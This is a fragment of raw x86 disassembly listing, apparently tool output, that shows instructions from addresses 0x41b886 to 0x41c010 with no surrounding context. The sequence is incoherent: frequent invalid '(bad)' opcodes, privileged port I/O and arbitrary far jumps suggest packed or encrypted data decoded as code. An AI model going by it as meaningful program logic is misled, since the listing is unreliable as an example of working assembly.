  41b886:	jge    0x41b8af
  41b888:	adc    DWORD PTR [ebx+0x544206f2],eax
  41b88e:	frndint 
  41b890:	pop    edx
  41b891:	jb     0x41b863
  41b893:	push   0xffffff97
  41b895:	or     esi,0x5b
  41b898:	pop    esi
  41b899:	and    ecx,DWORD PTR [eax+0x2fbfcc0b]
  41b89f:	in     al,0x86
  41b8a1:	les    edi,FWORD PTR [edi+0x134d07f7]
  41b8a7:	stos   BYTE PTR es:[edi],al
  41b8a8:	fwait
  41b8a9:	and    ebp,esp
  41b8ab:	mov    edx,0xbce830d4
  41b8b0:	jae    0x41b862
  41b8b2:	sbb    DWORD PTR [esi+0x13c5edb8],eax
  41b8b8:	mov    dl,0xaf
  41b8ba:	inc    ecx
  41b8bb:	addr16 push ebp
  41b8bd:	xor    BYTE PTR [ebx+0x74af4f8a],ah
  41b8c3:	mov    bh,0x5
  41b8c5:	adc    BYTE PTR [ecx+0x38],dh
  41b8c8:	stos   BYTE PTR es:[edi],al
  41b8c9:	add    DWORD PTR [ecx],ecx
  41b8cb:	adc    cl,BYTE PTR [esi]
  41b8cd:	cmp    ecx,ebp
  41b8cf:	push   ecx
  41b8d0:	shl    edx,cl
  41b8d2:	inc    eax
  41b8d3:	push   ecx
  41b8d4:	rcl    BYTE PTR [edx],0xb7
  41b8d7:	xchg   esi,eax
  41b8d8:	mov    ebx,0xe2722063
  41b8dd:	(bad)
  41b8e0:	push   es
  41b8e1:	out    dx,eax
  41b8e2:	jmp    0xc84f:0x60e7dd67
  41b8e9:	data16 sub BYTE PTR [eax+0x27614d5c],bl
  41b8f0:	fnstsw WORD PTR [ecx]
  41b8f2:	jo     0x41b8d0
  41b8f4:	test   eax,0x193a3a5
  41b8f9:	stos   BYTE PTR es:[edi],al
  41b8fa:	(bad)  
  41b8fb:	aad    0x67
  41b8fd:	sbb    ah,BYTE PTR [ecx]
  41b8ff:	add    dh,BYTE PTR [edx]
  41b901:	or     BYTE PTR [edi+edx*8+0x1afbafbd],bh
  41b908:	pop    edi
  41b909:	not    BYTE PTR [eax+0x451e53b1]
  41b90f:	dec    edi
  41b910:	mov    eax,ds:0x4a41c90b
  41b915:	xor    DWORD PTR [eax],ebp
  41b917:	into   
  41b918:	clc    
  41b919:	pop    eax
  41b91a:	and    ebp,DWORD PTR [edi-0x7522035a]
  41b920:	cmp    al,0x7b
  41b922:	das    
  41b923:	xchg   DWORD PTR [ecx+0x14bdda63],edi
  41b929:	(bad)  
  41b92a:	test   al,0x40
  41b92c:	mov    dh,0x77
  41b92e:	gs (bad) 
  41b930:	es mov al,0x6b
  41b933:	fwait
  41b934:	mov    ebx,0xe383f275
  41b939:	test   eax,0x40889054
  41b93e:	ss in  eax,dx
  41b940:	les    ebx,FWORD PTR [edx]
  41b942:	and    BYTE PTR [ebx],ah
  41b944:	xchg   edi,eax
  41b945:	sbb    dh,BYTE PTR [esp+esi*1]
  41b948:	call   0x3a8a:0x768bbdeb
  41b94f:	mov    BYTE PTR [esi-0x20289821],bh
  41b955:	mov    BYTE PTR [ebp-0x25d403c4],al
  41b95b:	push   ebp
  41b95c:	dec    ecx
  41b95d:	aad    0xe4
  41b95f:	into   
  41b960:	sar    BYTE PTR [edi+0x50],cl
  41b963:	imul   ebp,DWORD PTR [ebp+0x71a563d9],0xffffff94
  41b96a:	test   BYTE PTR [ecx-0x61329f0d],0xf
  41b971:	push   0xffffff8a
  41b973:	dec    edx
  41b974:	mov    bh,0x58
  41b976:	(bad)
  41b979:	test   eax,0xff11425c
  41b97e:	jle    0x41b9ca
  41b980:	test   cl,ch
  41b982:	imul   edx,ecx,0x7b40d0c8
  41b988:	mov    ch,0x27
  41b98a:	xor    eax,0xd3bdaaf2
  41b98f:	jbe    0x41b95a
  41b991:	pop    ds
  41b992:	popf   
  41b993:	jmp    0xe356:0x43df4797
  41b99a:	and    al,0x93
  41b99c:	ds pop ss
  41b99e:	out    dx,eax
  41b99f:	sbb    al,0xb8
  41b9a1:	bound  esi,QWORD PTR [ecx+esi*8+0x27]
  41b9a5:	cmp    edx,DWORD PTR ds:0x1902ccc
  41b9ab:	retf   0x4b1e
  41b9ae:	scas   eax,DWORD PTR es:[edi]
  41b9af:	mov    BYTE PTR [edi-0x1f83ee1a],bh
  41b9b5:	pop    es
  41b9b6:	ins    DWORD PTR es:[edi],dx
  41b9b7:	mov    dh,0x78
  41b9b9:	xchg   ebx,eax
  41b9ba:	sbb    ah,BYTE PTR [edx-0x19537225]
  41b9c0:	int    0x59
  41b9c2:	(bad)  
  41b9c3:	retfw  
  41b9c5:	dec    ebx
  41b9c6:	retf   
  41b9c7:	sub    esp,DWORD PTR [edx+0x69bae6e0]
  41b9cd:	xor    BYTE PTR [eax],al
  41b9cf:	enter  0x621b,0x45
  41b9d3:	ror    DWORD PTR [ebx+0x12],1
  41b9d6:	test   BYTE PTR [ebx],dl
  41b9d8:	in     eax,0x4a
  41b9da:	fdivr  st(6),st
  41b9dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9dd:	jnp    0x41b9e9
  41b9df:	adc    DWORD PTR [ecx],eax
  41b9e1:	out    dx,al
  41b9e2:	out    0x95,eax
  41b9e4:	aad    0x16
  41b9e6:	or     BYTE PTR [eax],bl
  41b9e8:	xor    edx,edi
  41b9ea:	lods   al,BYTE PTR ds:[esi]
  41b9eb:	addr16 aas 
  41b9ed:	enter  0x9477,0x2d
  41b9f1:	popf   
  41b9f2:	and    DWORD PTR [eax-0xa44bfbe],esi
  41b9f8:	push   eax
  41b9f9:	ja     0x41ba4a
  41b9fb:	pop    ss
  41b9fc:	cmp    ecx,DWORD PTR [ebp+eax*1-0x4a]
  41ba00:	dec    edx
  41ba01:	bound  esp,QWORD PTR [edx+0x6a5fcde0]
  41ba07:	xor    DWORD PTR [ebx],esi
  41ba09:	sub    eax,0x737a6731
  41ba0e:	das    
  41ba0f:	inc    eax
  41ba10:	dec    esp
  41ba11:	mov    WORD PTR [ebx-0x8b591ee],gs
  41ba17:	dec    edi
  41ba18:	pushf  
  41ba19:	xchg   esi,eax
  41ba1a:	outs   dx,DWORD PTR ds:[esi]
  41ba1b:	in     al,dx
  41ba1c:	dec    edi
  41ba1d:	ret    
	...
  41ba2a:	add    BYTE PTR [ecx-0x5b],bl
  41ba2d:	adc    DWORD PTR [edi-0x10a04803],0x2fef86b0
  41ba37:	mov    es,esi
  41ba39:	fucomp st(1)
  41ba3b:	adc    eax,0x2b0001db
  41ba40:	add    al,BYTE PTR [eax]
  41ba42:	add    BYTE PTR [esp+edi*2],cl
  41ba45:	mov    dl,0x99
  41ba47:	cdq    
  41ba48:	bound  ebp,QWORD PTR [esi]
  41ba4a:	dec    ebx
  41ba4b:	or     DWORD PTR [esi+0x144d8cd8],0x7a
  41ba52:	jo     0x41b9de
  41ba54:	fwait
  41ba55:	shl    DWORD PTR [esi+0x40f58f4d],0x6c
  41ba5c:	cmp    eax,0x206bed51
  41ba61:	outs   dx,DWORD PTR ds:[esi]
  41ba62:	add    bl,ah
  41ba64:	repz retf 0x4cc1
  41ba68:	pop    eax
  41ba69:	mov    cl,0xc0
  41ba6b:	or     bh,0x9e
  41ba6e:	scas   eax,DWORD PTR es:[edi]
  41ba6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba70:	jbe    0x41ba7d
  41ba72:	ffreep st(3)
  41ba74:	sub    DWORD PTR [edi],esi
  41ba76:	add    al,0x21
  41ba78:	mov    edi,0x136708e3
  41ba7d:	jge    0x41ba5b
  41ba7f:	je     0x41ba35
  41ba81:	push   edi
  41ba82:	repz jne 0x41ba33
  41ba85:	fmulp  st(7),st
  41ba87:	mov    eax,0xcc452fb4
  41ba8c:	stc    
  41ba8d:	jne    0x41ba5a
  41ba8f:	mov    es,WORD PTR ds:0xe4db60e1
  41ba95:	jo     0x41bac4
  41ba97:	addr16 xchg ecx,eax
  41ba99:	push   edx
  41ba9a:	out    0xf9,eax
  41ba9c:	jb     0x41bb1d
  41ba9e:	push   0xffffffaf
  41baa0:	inc    edi
  41baa1:	push   cx
  41baa3:	nop
  41baa4:	mov    BYTE PTR [ebp-0x59],al
  41baa7:	sub    edx,ecx
  41baa9:	jbe    0x41ba2c
  41baab:	shl    BYTE PTR [ebx],0xa4
  41baae:	push   cs
  41baaf:	sbb    al,0xd7
  41bab1:	out    dx,eax
  41bab2:	sub    BYTE PTR [edi],dh
  41bab4:	inc    esi
  41bab5:	hlt    
  41bab6:	adc    ebx,DWORD PTR [ecx]
  41bab8:	pop    eax
  41bab9:	xchg   edi,eax
  41baba:	sbb    BYTE PTR [esi],bl
  41babc:	fistp  QWORD PTR [ebx-0x16]
  41babf:	jle    0x41bacb
  41bac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bac2:	pop    ss
  41bac3:	xor    DWORD PTR [eax+0x2b0db6f2],esi
  41bac9:	jecxz  0x41ba72
  41bacb:	in     eax,dx
  41bacc:	cmc    
  41bacd:	outs   dx,DWORD PTR ds:[esi]
  41bace:	outs   dx,DWORD PTR ds:[esi]
  41bacf:	adc    DWORD PTR [edx-0x572ce847],esi
  41bad5:	jae    0x41bb1a
  41bad7:	div    DWORD PTR [edx-0x55]
  41bada:	mov    dh,0xca
  41badc:	jl     0x41baa3
  41bade:	or     eax,0x62842af1
  41bae3:	push   esi
  41bae4:	out    0x0,al
  41bae6:	sub    DWORD PTR ds:0x96f91cfd,edx
  41baec:	cs popa 
  41baee:	mov    ds:0x67c44d73,eax
  41baf3:	mov    edi,0xdafe6552
  41baf8:	test   BYTE PTR [esi],ch
  41bafa:	mov    al,ds:0xeb971e60
  41baff:	fwait
  41bb00:	or     bh,BYTE PTR ds:0xe422252b
  41bb06:	cld    
  41bb07:	aad    0x69
  41bb09:	mov    bp,0x567d
  41bb0d:	xor    eax,0x68204c46
  41bb12:	add    dh,ah
  41bb14:	dec    eax
  41bb15:	ins    BYTE PTR es:[edi],dx
  41bb16:	inc    ecx
  41bb17:	aad    0xce
  41bb19:	out    0xc8,al
  41bb1b:	shr    BYTE PTR [eax],0xb3
  41bb1e:	or     DWORD PTR [esi+0x20],esp
  41bb21:	adc    BYTE PTR [eax+0x1f],ah
  41bb24:	(bad)  
  41bb25:	(bad)
  41bb29:	pop    edx
  41bb2a:	xor    DWORD PTR [ecx],ebp
  41bb2c:	mov    cl,0x79
  41bb2e:	fwait
  41bb2f:	sbb    al,0x19
  41bb31:	mov    bh,0xc8
  41bb33:	fild   QWORD PTR ds:0x83064e57
  41bb39:	pop    es
  41bb3a:	pop    ebx
  41bb3b:	mov    esp,0x8fb22164
  41bb40:	das    
  41bb41:	add    al,BYTE PTR [esi-0x38]
  41bb44:	and    eax,0x6d54c7cd
  41bb49:	xor    edi,DWORD PTR [ecx]
  41bb4b:	ret    
  41bb4c:	(bad)  [ebx*1+0x3e622980]
  41bb53:	lahf   
  41bb54:	cmp    BYTE PTR [ebp+0x41ad33d3],dl
  41bb5a:	dec    edx
  41bb5b:	dec    edi
  41bb5c:	mov    edx,0x501a0055
  41bb61:	sbb    BYTE PTR [edx],ch
  41bb63:	loope  0x41bb1c
  41bb65:	rcr    BYTE PTR ds:0xd5de16b6,0x4
  41bb6c:	xchg   BYTE PTR [eax+0x62877afe],cl
  41bb72:	fs retf 0xc1c2
  41bb76:	ds ds ja 0x41bb66
  41bb7a:	pop    edi
  41bb7b:	popa   
  41bb7c:	push   ebx
  41bb7d:	fisub  DWORD PTR [esi+ebp*4-0x6b]
  41bb81:	or     eax,ebx
  41bb83:	cmp    DWORD PTR [ebp-0x6c],edx
  41bb86:	pop    esp
  41bb87:	sahf   
  41bb88:	ins    BYTE PTR es:[edi],dx
  41bb89:	xor    ebp,ebp
  41bb8b:	inc    ebp
  41bb8c:	lods   eax,DWORD PTR ss:[esi]
  41bb8e:	or     al,BYTE PTR [edx]
  41bb90:	push   edi
  41bb91:	sar    DWORD PTR [ecx+0x1d],0x95
  41bb95:	push   eax
  41bb96:	jmp    0x61dfd2c7
  41bb9b:	retf   0xae9a
  41bb9e:	xchg   DWORD PTR [ecx-0x414affbb],ebx
  41bba4:	xchg   esi,eax
  41bba5:	cmp    eax,0x49b15793
  41bbaa:	nop
  41bbab:	loope  0x41bbd6
  41bbad:	add    ecx,edx
  41bbaf:	or     eax,0x2025793b
  41bbb4:	pushf  
  41bbb5:	mov    cl,0xa6
  41bbb7:	jne    0x41bb8b
  41bbb9:	call   0x833a:0xcce78933
  41bbc0:	xchg   ecx,eax
  41bbc1:	or     edx,ebp
  41bbc3:	enter  0x4447,0xc5
  41bbc7:	loope  0x41bb5d
  41bbc9:	pop    eax
  41bbca:	shr    DWORD PTR [edi],1
  41bbcc:	fbstp  TBYTE PTR [esi-0x56]
  41bbcf:	fsub   st,st(1)
  41bbd1:	shl    ebp,cl
  41bbd3:	cli    
  41bbd4:	mov    al,ds:0xf44b99a6
  41bbd9:	(bad)  
  41bbdb:	lods   al,BYTE PTR ds:[esi]
  41bbdc:	and    DWORD PTR [ecx],0x6
  41bbdf:	mov    cs,WORD PTR [eax-0x32]
  41bbe2:	sti    
  41bbe3:	jmp    0xcb2c:0xfc0bb2e9
  41bbea:	or     al,bl
  41bbec:	nop
  41bbed:	xor    dl,BYTE PTR [ebx+0x19dd3ce6]
  41bbf3:	rol    dl,0x56
  41bbf6:	xchg   ecx,eax
  41bbf7:	xchg   esp,eax
  41bbf8:	mov    ch,0xbb
  41bbfa:	lods   al,BYTE PTR ds:[esi]
  41bbfb:	ins    DWORD PTR es:[edi],dx
  41bbfc:	das    
  41bbfd:	xlat   BYTE PTR ds:[ebx]
  41bbfe:	mov    esi,0xc6996306
  41bc03:	popa   
  41bc04:	mov    dh,0x0
  41bc06:	push   0xffffffda
  41bc08:	(bad)  
  41bc09:	jnp    0x41bbc6
  41bc0b:	mov    WORD PTR [esi+0x7e74284f],?
  41bc11:	mov    esi,0xd0b1b668
  41bc16:	lea    ebx,[esp+edi*2+0x10]
  41bc1a:	push   eax
  41bc1b:	cmc    
  41bc1c:	ja     0x41bc78
  41bc1e:	out    dx,al
  41bc1f:	and    dh,ch
  41bc21:	loop   0x41bbc7
  41bc23:	shr    BYTE PTR [eax+eiz*4],cl
  41bc26:	xchg   esi,eax
  41bc27:	inc    esi
  41bc28:	push   cs
  41bc29:	adc    ecx,DWORD PTR [ebp-0x75]
  41bc2c:	jmp    0x5980:0x57ab4691
  41bc33:	in     eax,dx
  41bc34:	out    dx,al
  41bc35:	add    edi,DWORD PTR [ebp-0x11d55b0e]
  41bc3b:	outs   dx,BYTE PTR ds:[esi]
  41bc3c:	sahf   
  41bc3d:	xor    bl,BYTE PTR [ecx+0x38]
  41bc40:	inc    eax
  41bc41:	mov    esi,0xff3f18ef
  41bc46:	fisubr WORD PTR [ebx]
  41bc48:	or     al,0x85
  41bc4a:	scas   eax,DWORD PTR es:[edi]
  41bc4b:	jmp    0x8f524e61
  41bc50:	pop    ecx
  41bc51:	std    
  41bc52:	shr    BYTE PTR ds:0xcc8f1974,1
  41bc58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc59:	ret    0x5137
  41bc5c:	sub    dh,bh
  41bc5e:	pop    es
  41bc5f:	hlt    
  41bc60:	push   esp
  41bc61:	cmp    esp,DWORD PTR [edx]
  41bc63:	in     eax,0xe0
  41bc65:	and    esi,DWORD PTR [ebp-0x48]
  41bc68:	sub    DWORD PTR [esi+ecx*4],ebp
  41bc6b:	push   eax
  41bc6c:	push   ss
  41bc6d:	xchg   edx,eax
	...
  41bc7a:	add    dh,dl
  41bc7c:	(bad)  
  41bc7d:	pop    ds
  41bc7e:	neg    BYTE PTR [edi]
  41bc80:	(bad)  
  41bc81:	jmp    edi
  41bc83:	xor    ah,ah
  41bc85:	adc    DWORD PTR [edx-0x46673399],eax
  41bc8b:	inc    eax
  41bc8c:	fld    QWORD PTR [ecx]
  41bc8e:	add    BYTE PTR [ebx],ch
  41bc90:	add    al,BYTE PTR [eax]
  41bc92:	add    al,bh
  41bc94:	out    0x11,eax
  41bc96:	mov    dh,0xa7
  41bc98:	add    al,0xdd
  41bc9a:	rcl    DWORD PTR [eax+0x3b],1
  41bc9d:	loope  0x41bc3f
  41bc9f:	dec    esp
  41bca0:	outs   dx,DWORD PTR ds:[esi]
  41bca1:	add    eax,0x22dd8b91
  41bca6:	(bad)  
  41bca8:	jg     0x41bc68
  41bcaa:	iret   
  41bcab:	aaa    
  41bcac:	jmp    0xcb70:0x4eb6abc9
  41bcb3:	add    eax,0xdd1da159
  41bcb8:	mov    edi,0x1465ca3f
  41bcbd:	daa    
  41bcbe:	inc    edi
  41bcbf:	mov    ebx,ebp
  41bcc1:	nop
  41bcc2:	sub    al,0x97
  41bcc4:	lea    esi,[edi+0x24d567cc]
  41bcca:	jge    0x41bc82
  41bccc:	rol    BYTE PTR [ebx+0x7e],0x19
  41bcd0:	push   0xb5c969cf
  41bcd5:	ins    BYTE PTR es:[edi],dx
  41bcd6:	loop   0x41bc6e
  41bcd8:	bound  esi,QWORD PTR [edi+0x226741bb]
  41bcde:	pop    ss
  41bcdf:	add    al,0x77
  41bce1:	inc    ebx
  41bce2:	mov    ebx,0xa62ad7ae
  41bce7:	or     ecx,esi
  41bce9:	ds inc edi
  41bceb:	jp     0x41bc9e
  41bced:	jmp    0x41bc8f
  41bcef:	mov    ebp,0xe5e97462
  41bcf4:	loopne 0x41bc78
  41bcf6:	and    eax,0x29dce3e4
  41bcfb:	ins    DWORD PTR es:[edi],dx
  41bcfc:	xchg   esi,eax
  41bcfd:	or     edx,DWORD PTR [edi]
  41bcff:	push   ebx
  41bd00:	pop    esp
  41bd01:	call   0xa6e4:0xb9c4633c
  41bd08:	or     DWORD PTR [ecx],esp
  41bd0a:	shl    DWORD PTR [edi+0x39fe19d7],1
  41bd10:	or     bh,bh
  41bd12:	nop
  41bd13:	icebp  
  41bd14:	dec    ebx
  41bd15:	cwde   
  41bd16:	and    esi,DWORD PTR [edx]
  41bd18:	or     BYTE PTR [esi+edi*4],bh
  41bd1b:	(bad)  
  41bd1c:	out    0xc0,al
  41bd1e:	out    0xf5,al
  41bd20:	add    DWORD PTR [ebx+0x2c47113f],ebx
  41bd26:	add    DWORD PTR [edx+0x76],edx
  41bd29:	aaa    
  41bd2a:	pop    esp
  41bd2b:	cmp    eax,0xdeffed70
  41bd30:	arpl   bp,si
  41bd32:	push   edx
  41bd33:	cmp    eax,DWORD PTR [ecx+eax*4-0x62]
  41bd37:	loopne 0x41bd98
  41bd39:	push   esp
  41bd3a:	pop    ebx
  41bd3b:	and    edx,DWORD PTR [ebx+edx*1+0x5503869]
  41bd42:	xor    BYTE PTR [ebx],0xab
  41bd45:	and    esp,DWORD PTR [ecx]
  41bd47:	mov    ebx,0xed647c99
  41bd4c:	xchg   edi,eax
  41bd4d:	adc    al,0xfa
  41bd4f:	mov    edx,edi
  41bd51:	inc    cl
  41bd53:	mov    ah,0xc9
  41bd55:	xchg   esp,edx
  41bd57:	fstp   DWORD PTR es:0xc2324e50
  41bd5e:	ret    
  41bd5f:	jno    0x41bd50
  41bd61:	cdq    
  41bd62:	xchg   ecx,eax
  41bd63:	add    al,0x27
  41bd65:	xchg   ebx,edi
  41bd67:	out    dx,al
  41bd68:	jb     0x41bd13
  41bd6a:	mov    cs,WORD PTR [edx+0x69782ec0]
  41bd70:	and    esi,ecx
  41bd72:	loope  0x41bd50
  41bd74:	dec    edx
  41bd75:	pop    esp
  41bd76:	pop    ebp
  41bd77:	lahf   
  41bd78:	icebp  
  41bd79:	push   ebx
  41bd7a:	dec    esp
  41bd7b:	cwde   
  41bd7c:	inc    ebp
  41bd7d:	add    DWORD PTR [esi+0x12],0x4b7240c0
  41bd84:	lea    edi,cs:[edi+esi*1+0x3d1556de]
  41bd8c:	loop   0x41bd97
  41bd8e:	ror    DWORD PTR [eax],1
  41bd90:	popa   
  41bd91:	mov    al,0x1e
  41bd93:	jl     0x41bdf6
  41bd95:	or     DWORD PTR ds:0xc046a9be,ebp
  41bd9b:	add    BYTE PTR [esi],al
  41bd9d:	inc    edi
  41bd9e:	jns    0x41bd2c
  41bda0:	push   esi
  41bda1:	aam    0xba
  41bda3:	imul   esi,ebx,0x1b0bf631
  41bda9:	jmp    0xd8a6d4b1
  41bdae:	push   ds
  41bdaf:	inc    eax
  41bdb0:	or     ecx,DWORD PTR [ecx-0x55]
  41bdb3:	mov    esp,0xf2182d13
  41bdb8:	pop    es
  41bdb9:	(bad)  
  41bdba:	cmp    al,0xc2
  41bdbc:	sahf   
  41bdbd:	add    al,0x2f
  41bdbf:	lds    eax,FWORD PTR [ecx]
  41bdc1:	jns    0x41be04
  41bdc3:	aaa    
  41bdc4:	jl     0x41bdd6
  41bdc6:	rol    DWORD PTR [edx],0xfa
  41bdc9:	pop    eax
  41bdca:	jno    0x41bd7a
  41bdcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdcd:	bound  eax,QWORD PTR [eax]
  41bdcf:	mov    ecx,0x53e2762
  41bdd4:	xor    eax,0xd22f455
  41bdd9:	sub    al,0xcf
  41bddb:	sbb    edx,DWORD PTR [ecx+edi*4]
  41bdde:	pusha  
  41bddf:	xor    eax,0xdc48e007
  41bde4:	push   ds
  41bde5:	xor    al,BYTE PTR ds:[eax-0x2a484f6c]
  41bdec:	pop    edi
  41bded:	(bad)  
  41bdee:	test   eax,0x2ae7f78
  41bdf3:	test   bl,bl
  41bdf5:	pop    edi
  41bdf6:	push   0x52
  41bdf8:	dec    ecx
  41bdf9:	sti    
  41bdfa:	push   cs
  41bdfb:	les    ecx,FWORD PTR [ecx+0x4c]
  41bdfe:	push   esp
  41bdff:	in     eax,dx
  41be00:	retf   0x862d
  41be03:	mov    ecx,0xf43c738e
  41be08:	neg    dl
  41be0a:	dec    edx
  41be0b:	bound  edi,QWORD PTR [eax-0x385a703d]
  41be11:	mov    BYTE PTR [edi+edi*8-0x5a],al
  41be15:	test   BYTE PTR [ecx+0x5d],bh
  41be18:	mov    ecx,0xfaa53e3d
  41be1d:	fs push edx
  41be1f:	sub    DWORD PTR [ebx+eiz*4-0x38],0x57
  41be24:	sti    
  41be25:	aaa    
  41be26:	or     eax,0x1bca3505
  41be2b:	push   edi
  41be2c:	int    0xfe
  41be2e:	mov    al,0x1
  41be30:	pop    ebp
  41be31:	ja     0x41be12
  41be33:	aad    0xa6
  41be35:	ins    DWORD PTR es:[edi],dx
  41be36:	add    BYTE PTR [ebp-0xf711cbf],cl
  41be3c:	inc    edi
  41be3d:	inc    ebx
  41be3f:	fidivr DWORD PTR [esp+esi*8-0x2a5baa77]
  41be46:	xor    dh,BYTE PTR [ebx+0x7]
  41be49:	sbb    ch,ch
  41be4b:	inc    ebp
  41be4c:	(bad)  
  41be4d:	xchg   esi,eax
  41be4e:	jae    0x41be59
  41be50:	sbb    ah,BYTE PTR [ebx-0x43]
  41be53:	(bad)  
  41be54:	ficomp WORD PTR [ebx]
  41be56:	push   ss
  41be57:	popf   
  41be58:	(bad)  [esi-0x7b]
  41be5b:	cpuid  
  41be5d:	mov    ah,0x96
  41be5f:	jb     0x41be9d
  41be61:	in     al,dx
  41be62:	mov    bl,0xa8
  41be64:	pop    ebp
  41be65:	rol    BYTE PTR [ebp+0x62c080e6],1
  41be6b:	pushf  
  41be6c:	in     al,0x57
  41be6e:	stos   DWORD PTR es:[edi],eax
  41be6f:	sub    edx,DWORD PTR [ebp+0x22974630]
  41be75:	xchg   DWORD PTR [edi+0x57],esi
  41be78:	repnz xchg esi,eax
  41be7a:	leave  
  41be7b:	xchg   edx,eax
  41be7c:	pop    esp
  41be7d:	outs   dx,DWORD PTR ds:[esi]
  41be7e:	sub    BYTE PTR [edx-0xf2f67de],0x16
  41be85:	in     al,dx
  41be86:	cdq    
  41be87:	and    eax,0x7bb4d8d8
  41be8c:	xchg   edi,eax
  41be8d:	and    al,0xb1
  41be8f:	xchg   edi,ecx
  41be91:	sub    edi,ebx
  41be93:	je     0x41be47
  41be95:	gs pop ebp
  41be97:	fs push esp
  41be99:	jle    0x41be9d
  41be9b:	aaa    
  41be9c:	pushf  
  41be9d:	aaa    
  41be9e:	(bad)  
  41be9f:	fld    QWORD PTR [ebp-0x1e]
  41bea2:	xchg   edx,eax
  41bea3:	and    al,0x61
  41bea5:	push   es
  41bea6:	cdq    
  41bea7:	xchg   edx,eax
  41bea8:	and    DWORD PTR ds:0xd26a8104,ebp
  41beae:	inc    ebx
  41beaf:	and    al,0xab
  41beb1:	sub    BYTE PTR [eax+0x61],cl
  41beb4:	dec    ebx
  41beb5:	sub    eax,0xd639fbb5
  41beba:	pop    ss
  41bebb:	fdivp  st(2),st
  41bebd:	repnz add BYTE PTR [eax],al
	...
  41bec8:	add    BYTE PTR [eax],al
  41beca:	add    BYTE PTR [ecx],ch
  41becc:	pop    ecx
  41becd:	push   ecx
  41bece:	bnd jno 0x41becb
  41bed1:	stos   DWORD PTR es:[edi],eax
  41bed2:	(bad)  [ebx+0x3f639b9e]
  41bed8:	mov    ecx,0xdf6b0c57
  41bedd:	add    DWORD PTR [eax],eax
  41bedf:	sub    eax,DWORD PTR [edx]
  41bee1:	add    BYTE PTR [eax],al
  41bee3:	or     cl,bl
  41bee5:	jns    0x41bf51
  41bee7:	mov    edi,0xc7904296
  41beec:	sbb    ah,BYTE PTR [esi+0x22]
  41beef:	jns    0x41befd
  41bef1:	stc    
  41bef2:	xor    edi,DWORD PTR [edi+0x6b5c1584]
  41bef8:	xchg   esp,eax
  41bef9:	idiv   edx
  41befb:	clc    
  41befc:	mov    esi,0x7c5a8649
  41bf01:	fcmovnu st,st(0)
  41bf03:	cmp    eax,ecx
  41bf05:	scas   al,BYTE PTR es:[edi]
  41bf06:	inc    esp
  41bf07:	retf   
  41bf08:	call   0x29facd33
  41bf0d:	mov    ebp,es
  41bf0f:	jg     0x41bec5
  41bf11:	jge    0x41bee7
  41bf13:	lea    ecx,[eax-0x5cf9dcb7]
  41bf19:	stc    
  41bf1a:	cli    
  41bf1b:	pop    ss
  41bf1c:	mov    al,0xdb
  41bf1e:	arpl   WORD PTR [esi-0x73],sp
  41bf21:	test   eax,esi
  41bf23:	cdq    
  41bf24:	dec    edx
  41bf25:	dec    ecx
  41bf26:	add    DWORD PTR [edi],eax
  41bf28:	fimul  DWORD PTR [esi-0x4953549c]
  41bf2e:	sahf   
  41bf2f:	ds jo  0x41bf3f
  41bf32:	or     DWORD PTR [edx-0x5fe8eff8],ecx
  41bf38:	or     BYTE PTR [edi],cl
  41bf3a:	dec    esi
  41bf3b:	mov    dl,0xa3
  41bf3d:	dec    esi
  41bf3e:	inc    edi
  41bf3f:	add    eax,0xf7234fe2
  41bf44:	cmp    al,0x6e
  41bf46:	(bad)  [esi]
  41bf48:	push   cs
  41bf49:	mov    ebp,0x73a95bde
  41bf4e:	loop   0x41bfa3
  41bf50:	icebp  
  41bf51:	or     ebx,DWORD PTR [edi-0x5dabb91f]
  41bf57:	jmp    0x851a:0x11351867
  41bf5e:	mov    eax,ds:0x1f146bed
  41bf63:	stos   BYTE PTR es:[edi],al
  41bf64:	out    dx,eax
  41bf65:	imul   edx,DWORD PTR [edx+ecx*1-0x22de5d04],0x85ee3246
  41bf70:	pushf  
  41bf71:	sahf   
  41bf72:	fidivr DWORD PTR [ebp-0x5b]
  41bf75:	dec    ebx
  41bf76:	and    DWORD PTR [ecx-0x18],esi
  41bf79:	dec    eax
  41bf7a:	pop    edi
  41bf7b:	hlt    
  41bf7c:	mov    edi,0xd59efc97
  41bf81:	jp     0x41bf3e
  41bf83:	rsm    
  41bf85:	sti    
  41bf86:	cmp    BYTE PTR [esi+0xa],0xba
  41bf8a:	aam    0x9c
  41bf8c:	fcomp  DWORD PTR [eax+0x4217ce10]
  41bf92:	cmc    
  41bf93:	xor    DWORD PTR [edi],ebx
  41bf95:	and    BYTE PTR [edx*1+0x5f097714],dh
  41bf9c:	mov    esi,0xc015c5c1
  41bfa1:	fdivr  QWORD PTR ds:0x1a1001c8
  41bfa7:	mov    ecx,ds
  41bfa9:	push   edi
  41bfaa:	mov    DWORD PTR [edi-0x74],0x7846e35a
  41bfb1:	mov    ebx,ecx
  41bfb3:	pusha  
  41bfb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfb5:	xchg   esi,eax
  41bfb6:	mov    al,ds:0x27857a81
  41bfbb:	data16 daa 
  41bfbd:	loop   0x41c00b
  41bfbf:	and    eax,0xdffd3a43
  41bfc4:	dec    ecx
  41bfc5:	jl     0x41bf8d
  41bfc7:	enter  0x64fd,0xf6
  41bfcb:	loope  0x41bf65
  41bfcd:	and    eax,0xad109bf
  41bfd2:	imul   eax,ebp,0x6a4a1390
  41bfd8:	or     eax,0xbbec8067
  41bfdd:	cmp    cl,BYTE PTR [edx]
  41bfdf:	aad    0xb5
  41bfe1:	xchg   ebx,eax
  41bfe2:	xor    DWORD PTR [ecx+eax*1],eax
  41bfe5:	mov    ch,BYTE PTR [edx-0x100d1497]
  41bfeb:	fucomi st,st(3)
  41bfed:	fst    QWORD PTR [ebx]
  41bfef:	sbb    eax,0xa01a5666
  41bff4:	pop    eax
  41bff5:	or     al,0x9e
  41bff7:	lahf   
  41bff8:	jp     0x41bfe2
  41bffa:	lods   eax,DWORD PTR ds:[esi]
  41bffb:	inc    esi
  41bffc:	test   eax,0x693de902
  41c001:	cmp    DWORD PTR [edi-0x56],edi
  41c004:	lahf   
  41c005:	repnz xor eax,0x76b2f2b
  41c00b:	scas   al,BYTE PTR es:[edi]
  41c00c:	jg     0x41c019
  41c00e:	xlat   BYTE PTR ds:[ebx]
  41c00f:	dec    ecx
  41c010:	push   DWORD PTR [ebx]
